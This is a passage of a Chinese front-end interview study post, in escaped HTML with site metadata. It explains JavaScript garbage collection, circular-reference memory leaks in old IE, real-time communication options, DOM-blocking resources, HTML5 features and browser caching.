</span>\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token number\">20</span> <span class=\"token punctuation\">;</span>             <span class=\"token comment\">//被标记 ，进入环境</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                     <span class=\"token comment\">//执行完毕 之后 a、b又被标离开环境，被回收。</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。 到目前为止，IE9+、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。</p>\n<p><strong>3. 引用计数</strong></p>\n<p>引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">;</span>         <span class=\"token comment\">//a的引用次数为0 </span>\n    <span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> a <span class=\"token punctuation\">;</span>         <span class=\"token comment\">//a的引用次数加1，为1 </span>\n    <span class=\"token keyword\">var</span> c <span class=\"token operator\">=</span>a<span class=\"token punctuation\">;</span>           <span class=\"token comment\">//a的引用次数再加1，为2</span>\n    <span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">//a的引用次数减1，为1</span>\n<span class=\"token punctuation\">&#125;</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Netscape Navigator3是最早使用引用计数策略的浏览器，但很快它就遇到一个严重的问题：循环引用。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">fn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    a<span class=\"token punctuation\">.</span>pro <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span>\n    b<span class=\"token punctuation\">.</span>pro <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">fn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>  以上代码a和b的引用次数都是2，fn()执行完毕后，两个对象都已经离开环境，在标记清除方式下是没有问题的，但是在引用计数策略下，因为a和b的引用次数不为0，所以不会被垃圾回收器回收内存，如果fn函数被大量调用，就会造成内存泄露。在IE7与IE8上，内存直线上升。</p>\n<p>我们知道，IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的<strong>COM对象依然是基于引用计数策略</strong>的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> element <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"some_element\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> myObject <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmyObject<span class=\"token punctuation\">.</span>e <span class=\"token operator\">=</span> element<span class=\"token punctuation\">;</span>\nelement<span class=\"token punctuation\">.</span>o <span class=\"token operator\">=</span> myObject<span class=\"token punctuation\">;</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>  这个例子在一个DOM元素（element)与一个原生js对象（myObject)之间创建了循环引用。其中，变量myObject有一个属性e指向element对象；而变量element也有一个属性o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。</p>\n<p>举个栗子：</p>\n<p><img src=\"https://static.nowcoder.com/images/activity/2021jxy/front/images/16a3a0cb350a31ae\" alt=\"img\"></p>\n<ul>\n<li>黄色是指直接被 js变量所引用，在内存里</li>\n<li>红色是指间接被 js变量所引用，如上图，refB 被 refA 间接引用，导致即使 refB 变量被清空，也是不会被回收的</li>\n<li>子元素 refB 由于 <code>parentNode</code> 的间接引用，只要它不被删除，它所有的父元素（图中红色部分）都不会被删除</li>\n</ul>\n<p>另一个例子：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span><span class=\"token operator\">=</span><span class=\"token keyword\">function</span> <span class=\"token function\">outerFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"element\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    obj<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclick</span><span class=\"token operator\">=</span><span class=\"token keyword\">function</span> <span class=\"token function\">innerFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这段代码看起来没什么问题，但是obj引用了document.getElementById(‘element’)，而document.getElementById(‘element’)的onclick方法会引用外部环境中的变量，自然也包括obj，是不是很隐蔽啊。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是ie上会有这个bug)</p>\n<p><strong>解决办法：</strong></p>\n<p>最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">myObject<span class=\"token punctuation\">.</span>element <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\nelement<span class=\"token punctuation\">.</span>o <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n\nwindow<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span><span class=\"token operator\">=</span><span class=\"token keyword\">function</span> <span class=\"token function\">outerFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"element\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    obj<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclick</span><span class=\"token operator\">=</span><span class=\"token keyword\">function</span> <span class=\"token function\">innerFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    obj<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。</p>\n<p>要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变</p>\n<p><strong>4. 内存管理</strong></p>\n<p><strong>4.1 什么时候触发垃圾回收？</strong></p>\n<p>垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。</p>\n<p>微软在IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，如果回收的内存高于85%，说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多</p>\n<p><strong>4.2 合理的GC方案</strong></p>\n<p><strong>1. 基础方案</strong></p>\n<p>Javascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除），即：</p>\n<ol>\n<li>遍历所有可访问的对象。</li>\n<li>回收已不可访问的对象。</li>\n</ol>\n<p><strong>2. GC的缺陷</strong></p>\n<p>和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：避免GC造成的长时间停止响应。</p>\n<p><strong>3. GC优化策略</strong></p>\n<p>David大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了：</p>\n<ol>\n<li><p><strong>分代回收</strong>（Generation GC） 这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：</p>\n<p>这里需要补充的是：对于tenured generation对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。 这里主要内容可以参考</p>\n<p>深入浅出Node</p>\n<p>中关于内存的介绍，很详细~</p>\n</li>\n<li><p><strong>增量GC</strong> 这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图：</p>\n<p>这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。</p>\n<p>因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。</p>\n<p>比如：低 (对象&#x2F;s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。</p>\n</li>\n</ol>\n<h3 id=\"6、有什么方法可以保持前后端实时通信\"><a href=\"#6、有什么方法可以保持前后端实时通信\" class=\"headerlink\" title=\"6、有什么方法可以保持前后端实时通信\"></a>6、有什么方法可以保持前后端实时通信</h3><p><strong>参考答案</strong>：</p>\n<p>实现保持前后端实时通信的方式有以下几种</p>\n<ul>\n<li>WebSocket： IE10以上才支持，Chrome16, FireFox11,Safari7以及Opera12以上完全支持，移动端形势大</li>\n<li>event-source: IE完全不支持（注意是任何版本都不支持），Edge76，Chrome6,Firefox6,Safari5和Opera以上支持， 移动端形势大好</li>\n<li>AJAX轮询： 用于兼容低版本的浏览器</li>\n<li>永久帧（ forever iframe）可用于兼容低版本的浏览器</li>\n<li>flash socket 可用于兼容低版本的浏览器</li>\n</ul>\n<h3 id=\"7、会阻塞dom解析的资源有：\"><a href=\"#7、会阻塞dom解析的资源有：\" class=\"headerlink\" title=\"7、会阻塞dom解析的资源有：\"></a>7、会阻塞dom解析的资源有：</h3><p>1.内联css</p>\n<p>2.内联js</p>\n<p>3.普通外联js</p>\n<p>4.外联defer js </p>\n<p>5.js之前的外联css</p>\n<ol>\n<li><p>css加载不会阻塞DOM树的解析</p>\n</li>\n<li><p>css加载会阻塞DOM树的渲染</p>\n</li>\n<li><p>css加载会阻塞后面js语句的执行</p>\n</li>\n</ol>\n<p>一、iframe会阻塞主页面的onload事件；</p>\n<p>二、搜索引擎检索程序无法解读这种页面，不利于SEO；</p>\n<p>三、会影响页面的并行加载。</p>\n<p>并行加载：同一时间对同一域名下的加载数量是有限制的：</p>\n<p>MDN解析：当初始HTML文档已完全加载和解析时，将触发DOMContentLoaded事件，而不需要等待样式表，图像和子框架页面加载（事件可以用来检测HTML页面是否完全加载完毕(fully-loaded)）。</p>\n<h2 id=\"h5新特性\"><a href=\"#h5新特性\" class=\"headerlink\" title=\"h5新特性\"></a>h5新特性</h2><ol>\n<li>新的选择器：document.querySelector,document.querySelestorAll</li>\n<li>拖拽释放Api：Drag,Drop</li>\n<li>存储：sessionStorage,localStorage</li>\n<li>媒体元素 video audio</li>\n<li>页面间通信：postMessage</li>\n<li>历史：history</li>\n<li>全双工通信webSocket</li>\n<li>语义化标签</li>\n<li>绘画canvas</li>\n</ol>\n<h2 id=\"浏览器9种缓存方式\"><a href=\"#浏览器9种缓存方式\" class=\"headerlink\" title=\"浏览器9种缓存方式\"></a>浏览器9种缓存方式</h2><ol>\n<li>Http缓存：是基于Http协议的浏览器缓存方式</li>\n<li>webSql：只有较高版本的Chrome浏览器支持</li>\n<li>indexDB：是一个为了在客户端存储可观数量的结构化数据，并在这些数据上进行高性能索引的Api</li>\n<li>Cookie：通常是网站为了辨别用户身份进行Session存储</li>\n<li>Localstorage：Html5新增的一种本地缓存方案，一般用于存储数据，加快下次渲染速度</li>\n<li>sessionStorage：与localstorage类似，页面关闭就会销毁</li>\n<li>application cache：将大部分js，css，图片等静态资源放在manifast文件配置中</li>\n<li>cacheStorage :serverWorker规范中定义的</li>\n<li>flash缓存：主要基于flash有读写浏览器端本地目录的功能</li>\n</ol>\n<h2 id=\"大前端是什么？\"><a href=\"#大前端是什么？\" class=\"headerlink\" title=\"大前端是什么？\"></a><strong>大前端是什么？</strong></h2><p>简单来说，大前端就是所有前端的统称，比如Android、iOS、web、Watch等，最接近用户的那一层也就是UI层，然后将其统一起来，就是大前端。大前端最大的特点在于一次开发，同时适用于所有平台，开发者不用为一个APP需要做Android和iOS两种模式而担心。大前端是web统一的时代，利用web不仅能开发出网站，更可以开发手机端web应用和移动端应用程序。</p>\n<p><strong>大前端为什么出现？</strong></p>\n<p>由于node的出现，前端工程师不需要依赖于后端程序而直接运行，从而前后端分离起来。所以当开发一个新产品的时候服务只需要写一次，但是面向用户的产品可能有很多，例如网站、Android客户端、iOS客户端和微信小程序等。由于各个平台使用的技术栈都不一样，代码无法复用，非常浪费人力、物力。那么有没有什么技术能够解决这一痛点呢？大前端应运而生，其实大前端的主要核心就是跨平台技术，有了跨平台技术，各个平台的差异性就抹平了，开发者只需要一套技术栈就可以开发出适用于多个平台的客户端。</p>\n<p><strong>跨平台方案简介</strong></p>\n<p>目前的主流跨平台方案：Cordova&#x2F;phoneGap、React Native、Weex、微信小程序、PWA和Flutter等，根据其原理性，可以分为三大类。</p>\n<p>H5+原生（Cordova、Ionic、微信小程序）<br>JavaScript开发+原生渲染 （React Native、Weex、快应用）<br>自绘UI+原生(Flutter)<br>增强版Web App(PWA)</p>\n","feature":true,"text":"html基础1.自定义列表&lt;!DOCTYPE html> &lt;html lang=\"zh\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width...","link":"","photos":[],"count_time":{"symbolsCount":"133k","symbolsTime":"2:01"},"categories":[],"tags":[{"name":"面试","slug":"面试","count":1,"path":"api/tags/面试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#html%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">html基础</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">1.自定义列表</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E5%A4%9A%E5%AA%92%E4%BD%93%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%9F%B3%E9%A2%91%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">2.多媒体标签之音频标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-onerror-%E4%BA%8B%E4%BB%B6\"><span class=\"toc-text\">3.onerror 事件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88link%E7%94%A8href%E8%8E%B7%E5%8F%96%E8%B5%84%E6%BA%90-script%E5%92%8Cimg%E7%94%A8src\"><span class=\"toc-text\">4、为什么link用href获取资源 script和img用src</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CSS\"><span class=\"toc-text\">CSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-css%E9%80%89%E6%8B%A9%E6%9F%90%E4%B8%80%E4%B8%AA-CSS-first-child-%E9%80%89%E6%8B%A9%E5%99%A8-CSS%E9%80%89%E6%8B%A9%E5%99%A8%E2%80%94%E2%80%94%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8\"><span class=\"toc-text\">1.css选择某一个 (CSS :first-child 选择器,CSS选择器——伪类选择器)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81CSS-%E8%BE%B9%E6%A1%86%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">2、CSS 边框属性</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#border-style%E5%8F%AF%E8%83%BD%E7%9A%84%E5%80%BC\"><span class=\"toc-text\">border-style可能的值</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81-CSS%E9%80%89%E6%8B%A9%E5%99%A8%E2%80%94%E2%80%94%E4%BC%AA%E5%85%83%E7%B4%A0\"><span class=\"toc-text\">3、 CSS选择器——伪元素</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-after\"><span class=\"toc-text\">1. ::after</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-before\"><span class=\"toc-text\">2. ::before</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-first-letter\"><span class=\"toc-text\">3. ::first-letter</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-first-line\"><span class=\"toc-text\">4. ::first-line</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-selection\"><span class=\"toc-text\">5. ::selection</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#6-placeholder\"><span class=\"toc-text\">6. ::placeholder</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E5%9C%86%E8%A7%92\"><span class=\"toc-text\">4、圆角</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E6%B5%AE%E5%8A%A8%E5%92%8C%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8\"><span class=\"toc-text\">5、浮动和清除浮动</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8\"><span class=\"toc-text\">清除浮动:</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6%E3%80%81%E5%9B%BA%E5%AE%9A%E5%AE%9A%E4%BD%8D\"><span class=\"toc-text\">6、固定定位</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7%E3%80%81CSS%E5%8D%95%E4%BD%8D%EF%BC%88%E4%B8%80%EF%BC%89\"><span class=\"toc-text\">7、CSS单位（一）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#em%E5%92%8Crem\"><span class=\"toc-text\">em和rem</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#8%E3%80%81%E7%BB%A7%E6%89%BF%E7%9B%B8%E5%85%B3\"><span class=\"toc-text\">8、继承相关</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#9%E3%80%81css%E9%A2%84%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">9、css预处理工具</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#10%E3%80%81%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0%E5%92%8C%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%8C%E7%84%B6%E5%90%8E%E6%80%8E%E4%B9%88%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">10、行内元素和块级元素什么区别，然后怎么相互转换</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#11%E3%80%81%E6%A0%B7%E5%BC%8F%E4%BC%98%E5%85%88%E7%BA%A7\"><span class=\"toc-text\">11、样式优先级</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#12%E3%80%81%E7%9B%92%E5%AD%90%E5%A1%8C%E9%99%B7%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F\"><span class=\"toc-text\">12、盒子塌陷是什么？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#13%E3%80%81css-%E4%BC%AA%E7%B1%BB%E4%B8%8E%E4%BC%AA%E5%85%83%E7%B4%A0%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">13、css 伪类与伪元素区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#14%E3%80%81%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0%E7%9A%84margin-%E5%92%8C-padding\"><span class=\"toc-text\">14、行内元素的margin 和 padding</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#15%E3%80%81min-width-x2F-max-width-%E5%92%8C-min-height-x2F-max-height-%E5%B1%9E%E6%80%A7%E9%97%B4%E7%9A%84%E8%A6%86%E7%9B%96%E8%A7%84%E5%88%99%EF%BC%9F\"><span class=\"toc-text\">15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#16%E3%80%81%E6%9C%AA%E7%9F%A5%E9%AB%98%E5%BA%A6%E5%85%83%E7%B4%A0%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E3%80%81%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F\"><span class=\"toc-text\">16、未知高度元素垂直居中、水平居中的实现方式有哪些？</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Javascript\"><span class=\"toc-text\">Javascript</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81JS%E4%B8%AD%E7%9A%84instanceof%E8%BF%90%E7%AE%97%E7%AC%A6\"><span class=\"toc-text\">1、JS中的instanceof运算符</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%8E%92%E5%BA%8F\"><span class=\"toc-text\">2、排序</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81JS%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%A7%E5%86%99%E5%92%8C%E5%B0%8F%E5%86%99%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">3、JS字符串大写和小写之间的转换</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81javascript%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4%E6%8C%87%E5%AE%9A%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0\"><span class=\"toc-text\">4、javascript如何删除指定数组元素</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">5、数组方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95%E6%A6%82%E6%8B%AC\"><span class=\"toc-text\">数组方法概括</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6%E3%80%81%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">6、对象</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Number-%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">Number 对象</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%B9%E8%B1%A1%E5%AD%97%E7%AC%A6%E4%B8%B2\"><span class=\"toc-text\">对象字符串</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E9%81%8D%E5%8E%86%EF%BC%9A\"><span class=\"toc-text\">对象属性遍历：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B7%BB%E5%8A%A0%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">添加属性</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">删除对象属性</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2\"><span class=\"toc-text\">7、字符串</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#String-%E5%AF%B9%E8%B1%A1%E4%B8%AD%E7%9A%84%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">String 对象中的方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%BB%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B7%A6%E5%8F%B3%E4%B8%A4%E8%BE%B9%E7%9A%84%E7%A9%BA%E6%A0%BC\"><span class=\"toc-text\">去除字符串左右两边的空格</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#8%E3%80%81js-%E6%97%B6%E9%97%B4%E4%B8%8E%E6%97%B6%E9%97%B4%E6%88%B3%E7%9A%84%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">8、js 时间与时间戳的转换</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E8%BD%AC%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%9A\"><span class=\"toc-text\">时间转时间戳：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E6%97%B6%E9%97%B4\"><span class=\"toc-text\">时间戳转时间</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#9%E3%80%81Arguments-%E5%AF%B9%E8%B1%A1\"><span 